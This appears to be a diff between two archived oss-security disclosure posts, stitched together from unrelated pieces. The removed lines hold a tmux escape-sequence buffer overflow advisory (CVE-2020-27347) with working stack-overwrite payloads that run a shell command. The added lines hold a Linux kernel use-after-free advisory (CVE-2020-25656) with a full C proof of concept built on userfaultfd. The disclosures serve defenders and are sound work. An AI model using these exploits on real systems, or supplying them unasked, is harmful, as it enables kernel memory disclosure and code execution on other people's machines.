@@ -1,80 +1,213 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/05/3
-Message-ID: <0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>
-Date: Thu, 05 Nov 2020 16:03:12 +0300
-From: snizovtsev@...il.com
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/16/1
+Message-ID: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>
+Date: Fri, 16 Oct 2020 11:39:34 +0800
+From: Minh Yuan <yuanmingbuaa@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2020-27347: tmux buffer overflow in escape sequence parser
+Cc: nopitydays@...il.com
+Subject: CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-I recently discovered a bug in tmux (terminal multiplexer) which could
-lead to crash or code execution. The bug was in
-`input_csi_dispatch_sgr_colon` function which is used by tmux server
-process.
+We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
+version 3.4 to the latest version (v5.9 for now).
 
-The problem is that a bound check for a stack-allocated array `p` is
-bypassed if 8th chunk of input buffer is empty:
+The root cause of this vulnerability is that there exits a race in
+KDGKBSENT and KDSKBSENT.
 
-        while ((out = strsep(&ptr, ":")) != NULL) {
-                if (*out != '\0') {
-                        p[n++] = strtonum(out, 0, INT_MAX, &errstr);
-                        if (errstr != NULL || n == nitems(p)) {
-                                return;
-                        }
-                } else
-                        n++;
-        }
+Here are details:
+1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
+2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
+func_table, at the same time, due to KDGKBSENT has no lock, we can use
+KDSKBSENT again to allocate a larger buffer than step1, and the old
+funcbufptr will be freed. However, we've obtained the heap pointer in
+KDGKBSENT, so a uaf read will happen while executing put_user.
 
-Thus by using an escape sequence like "\033[::::::7::1:2:3::5:6:7:m" we
-can overwrite arbitrary 4-byte locations on the stack. Moreover, an
-empty arguments ("::") may be used to skip choosen offsets, and thereby
-keep stack canaries untouched.
+I've successfully reproduced this bug in a special way.
+However, to write a universal PoC for anyone else to reproduce it,  I use
+userfaultfd to handle the order of "free" and "use" in multithreading
+environment. This is my PoC:
 
-Code execution is proved practical only if tmux address space isn't
-fully randomized. So ASLR with PIE will mitigiate this issue but more
-complex exploits may be theoretically created.
+// author by ziiiro@thu
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <poll.h>
+#include <pthread.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <linux/userfaultfd.h>
+#include <pthread.h>
+#include <poll.h>
+#include <linux/prctl.h>
+#include <stdint.h>
 
-=== Affected versions / distributions ===
+#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
+                       } while (0)
 
-- tmux 2.9-3.1b
-- Ubuntu 20.04
-- Debian 11
-- Fedora 31+
-- Alpine 3.10+
-- openSUSE Leap 15.2
-- OpenBSD 6.5+
+#define KDGKBSENT 0x4B48 /* gets one function key string entry */
+#define KDSKBSENT 0x4B49 /* sets one function key string entry */
 
-=== Exploitation (testing purposes only) ===
+struct kbsentry {
+unsigned char kb_func;
+unsigned char kb_string[512];
+};
+int fd;
+static int page_size;
+static void *fault_handler_thread(void *arg) {
+  unsigned long value;
+  static struct uffd_msg msg;
+  static int fault_cnt = 0;
+  long uffd;
+  static char *page = NULL;
+  struct uffdio_copy uffdio_copy;
+  int len, i;
+  if (page == NULL) {
+    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
+  }
+  uffd = (long)arg;
 
-I haven't found any ways to leak addresses so ASLR must be disabled:
-sysctl -w kernel.randomize_va_space=0
+  for(;;) {
+    struct pollfd pollfd;
+    pollfd.fd = uffd;
+    pollfd.events = POLLIN;
+    len = poll(&pollfd, 1, -1);
 
-Then open tmux and feed it with the following sequence:
 
-for tmux 3.0a-2ubuntu0.1 on Ubuntu 20.04.1 x86_64:
+    read(uffd, &msg, sizeof(msg));
+    printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
+    printf("    address = 0x%lx\n", msg.arg.pagefault.address);
+    switch(fault_cnt) {
+        case 0:
+            puts("triggered in the first page!");
+            break;
+        case 1:
+            puts("triggered in the seccond page!");
+            munmap((void*)0x233000,page_size);
+            void *addr = (void*)mmap((void*)0x233000,
+                        page_size,
+                        PROT_READ | PROT_WRITE,
+                        MAP_FIXED | MAP_PRIVATE | MAP_ANON,
+                        -1, 0);
+            if ((unsigned long)addr != 0x233000)
+                errExit("mmap (0x233000)");
+            // register 0x233000 again to trigger put_user
+            struct uffdio_register uffdio_register;
+            uffdio_register.range.start = (unsigned long)addr;
+            uffdio_register.range.len   = page_size;
+            uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
+            if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+                errExit("ioctl: UFFDIO_REGITER");
+            break;
+        case 2:
+            puts("triggered in put_user!");
+            struct kbsentry *kbs;
+            kbs = malloc(sizeof(struct kbsentry));
+            kbs->kb_func = 0;
 
-echo -e
-'\033[::::::::::::::::::1431728064::::::::1431829797::::1431915746::m;t
-ouch /tmp/PWNED;\0';
- 
-for tmux-3.1-2.fc33.x86_64 on Fedora 33:
-echo -e
-'\033[::::::::::::::::::1431723856::::::::1432185743::::1431836040::m;t
-ouch /tmp/PWNED;\0';
+strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
+            // free old funcbufptr
+            ioctl(fd,KDSKBSENT,kbs);
+            break;
 
-If done, `/tmp/PWNED` would indicate that the attack succeed.
+    }
+    // return to kernel-land
+    uffdio_copy.src = (unsigned long)page;
+    uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
+~(page_size - 1);
+    uffdio_copy.len = page_size;
+    uffdio_copy.mode = 0;
+    uffdio_copy.copy = 0;
+    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+        errExit("ioctl: UFFDIO_COPY");
 
-=== Timeline ===
-* 29 Oct 2020 - Vulnerability reported to author, security ()
-openbsd.org, RedHat, SUSE and Canonical.
-* 29 Oct 2020 - OpenBSD Errata published.
-* 29 Oct 2020 - Fixed in OpenBSD and tmux 3.1c.
-* 30 Oct 2020 - CVE-2020-27347 assigned.
-* 05 Nov 2020 - Vulnerability opened.
+    fault_cnt++;
 
---
-Regards,
-Sergey Nizovtsev.
+  }
+}
+// use userfaultfd to handle free->use
+void setup_pagefault(void *addr, unsigned size) {
+  long uffd;
+  pthread_t th;
+  struct uffdio_api uffdio_api;
+  struct uffdio_register uffdio_register;
+  int s;
+  // new userfaulfd
+
+  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+  if (uffd == -1) errExit("userfaultfd");
+  // enabled uffd object
+  uffdio_api.api = UFFD_API;
+  uffdio_api.features = 0;
+  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
+UFFDIO_API");
+  // register memory address
+  uffdio_register.range.start = (unsigned long)addr;
+  uffdio_register.range.len   = size;
+  uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
+//UFFDIO_REGISTER_MODE_WP;//
+  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("ioctl:
+UFFDIO_REGITER");
+  // monitor page fault
+  s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
+  if (s != 0) errExit("pthread_create");
+}
+
+
+int main(int argc, char** argv)
+{
+        struct kbsentry *kbs;
+        pthread_t th;
+        page_size = sysconf(_SC_PAGE_SIZE);
+        void *addr = (void*)mmap((void*)0x233000,
+                            page_size * 2,
+                            PROT_READ | PROT_WRITE,
+                            MAP_FIXED | MAP_PRIVATE | MAP_ANON,
+                            -1, 0);
+        if ((unsigned long)addr != 0x233000)
+            errExit("mmap (0x233000)");
+        setup_pagefault(addr, page_size * 2);
+        kbs = malloc(sizeof(struct kbsentry));
+        kbs->kb_func = 0;
+        fd = open("/dev/tty1", O_RDONLY, 0);
+
+strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+        // allocate a lager funcbufptr
+        ioctl(fd,KDSKBSENT,kbs);
+        // use KDGKBSENT to access the new funcbufptr
+        ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
+        return 1;
+
+}
+
+Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
+is also needed. Besides, it needs the privilege to access tty to trigger
+this bug.
+
+We've noticed that this bug was also discovered by Syzbot 8 months ago, but
+no one has successfully reproduced it (
+https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
+leaving this issue ignored and upatched yet. Hope this PoC can help
+someone.
+
+Timeline:
+* 10.15.20 - Vulnerability reported to security@...nel.org and
+linux-distros@...openwall.org.
+* 10.15.20 - CVE-2020-25656 assigned.
+* 10.16.20 - Vulnerability opened.
+
+Thanks,
+Yuan Ming and Bodong Zhao, Tsinghua University
 
